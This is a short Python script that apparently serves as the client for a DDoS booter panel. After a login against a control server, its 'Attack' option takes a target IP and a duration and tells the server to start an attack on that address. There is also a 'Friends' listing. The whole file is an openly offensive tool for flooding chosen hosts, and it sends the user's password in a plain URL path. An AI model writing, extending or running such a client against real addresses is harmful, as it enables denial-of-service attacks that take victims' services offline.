from colorama import init, Fore
import requests
from os import system, name
from time import sleep
server = 'http://127.0.0.1:5000'
init(True)
def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')
def drawmenu():
    print(f'''{Fore.RED}     ▄  █ ████▄ █     ██▄   █▀▄▀█ ▀▄    ▄ ▄  █ ██      ▄   ██▄   
    █   █ █   █ █     █  █  █ █ █   █  █ █   █ █ █      █  █  █  
    ██▀▀█ █   █ █     █   █ █ ▄ █    ▀█  ██▀▀█ █▄▄█ ██   █ █   █ 
    █   █ ▀████ ███▄  █  █  █   █    █   █   █ █  █ █ █  █ █  █  
       █            ▀ ███▀     █   ▄▀       █     █ █  █ █ ███▀  
      ▀                       ▀            ▀     █  █   ██       
                                                ▀                ''')
    print(f'{Fore.CYAN}1. Attack')
    print(f'{Fore.CYAN}2. Friends')
    print(f'{Fore.CYAN}0. Exit')
clear()
print(f'''{Fore.GREEN}     ▄  █ ████▄ █     ██▄   █▀▄▀█ ▀▄    ▄ ▄  █ ██      ▄   ██▄   
    █   █ █   █ █     █  █  █ █ █   █  █ █   █ █ █      █  █  █  
    ██▀▀█ █   █ █     █   █ █ ▄ █    ▀█  ██▀▀█ █▄▄█ ██   █ █   █ 
    █   █ ▀████ ███▄  █  █  █   █    █   █   █ █  █ █ █  █ █  █  
       █            ▀ ███▀     █   ▄▀       █     █ █  █ █ ███▀  
      ▀                       ▀            ▀     █  █   ██       
                                            ▀                ''')
print(f'{Fore.RED} God is dead and we killed him. ')
username = input(f'{Fore.YELLOW}Username: ')
passwd = input(f'{Fore.YELLOW}Password: {Fore.BLACK}')
with requests.get(f'{server}/ident/{username}/{passwd}') as url:
    if url.text == 'lul\n':
        exit(0)
    else:
        print(f'{Fore.CYAN} Welcome {username}')


while True:
    clear()
    drawmenu()
    select = input('~> ')
    try:
        select = int(select)
    except ValueError:
        print(f'{Fore.RED}That wasnt a number m8')
        sleep(3)
    if select == 0:
        exit(0)
    elif select == 1:
        ip = input(f'{Fore.GREEN}Target IP: ')
        timeout = input(f'{Fore.GREEN}Attack time (seconds): ')
        requests.get(f'{server}/scare/{username}/{passwd}/{ip}/{timeout}')
        input(f'{Fore.RED}Attack started, press enter to go back to the menu.')
    elif select == 2:
        print(requests.get(f'{server}/friends').text)
        input(f'{Fore.RED}Press enter to go back to the menu.')
    else:
        print(f'{Fore.RED}Option not found.')
        sleep(3)
